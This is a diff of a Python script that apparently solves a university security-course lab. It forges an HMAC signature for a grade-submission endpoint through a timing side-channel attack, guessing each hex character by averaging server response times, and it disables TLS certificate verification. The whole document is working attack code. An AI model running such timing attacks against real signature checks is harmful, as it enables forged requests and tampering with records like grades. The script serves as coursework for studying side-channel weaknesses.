@@ -3,41 +3,44 @@ import hashlib
 import requests
 import urllib3
 
+def getAverage(URL, parameters, iterations):
+    total = 0
+    for j in range (0, iterations):  
+        total += requests.get(url = URL, params = parameters, verify=False).elapsed.total_seconds()
+    return total / iterations
+
 if __name__ == '__main__':
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # Removes ssl related warnings. 
-
     name = 'kalle'
     grade = '5'
-    key = 'trivial'
-    # api-endpoint 
+    key = 'k'
     URL = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php"
-
     concat = bytes(name, encoding='utf8') + bytes(grade, encoding='utf8')
     signature = hmac.new(bytes(key, encoding='utf8'), concat, hashlib.sha1).hexdigest()[:20]
     
     elapsed = 0
-    
     signature = list(signature)
-    finalSig = list(signature)
+    bestChar = None
     for i in range (0,20):
-        for char in '1234567890abcdef':
+        for char in '0123456789abcdef':
             signature[i] = char
             parameters = {'name':name, 'grade':grade, 'signature':''.join(signature)} 
-            total = 0
-            for j in range (0, 5):  
-                result = requests.get(url = URL, params = parameters, verify=False)
-                total += result.elapsed.total_seconds()
-            average = total / 5
-            print(i, char, average)
+            average = getAverage(URL, parameters, 10)
             if (average > elapsed):
-                finalSig[i] = char
+                bestChar= char
                 elapsed = average
-                print (elapsed)
-                print (finalSig)
-        signature[i] = finalSig[i]
+                print ("charPos:", i, "Char:", char, "Average:", average, "-> NEW BEST TIME, THE CHAR IS:", char)
+            else:
+                print("charPos:", i, "Char:", char, "Average:", average)
+        signature[i] = bestChar
+        print("Chosen char:", bestChar)
+        print("------------------------")
         elapsed = 0
 
-    parameters = {'name':name, 'grade':grade, 'signature':signature}        
+    parameters = {'name':name, 'grade':grade, 'signature':''.join(signature)}        
     result = requests.get(url = URL, params = parameters, verify=False)
-    data = result.json() 
-    print(data) 
+    data = result.json()
+    if(data == '1'):
+        print("Success signature is:", ''.join(signature))
+    else:
+        print("Unsuccessful answer from server is:", data)
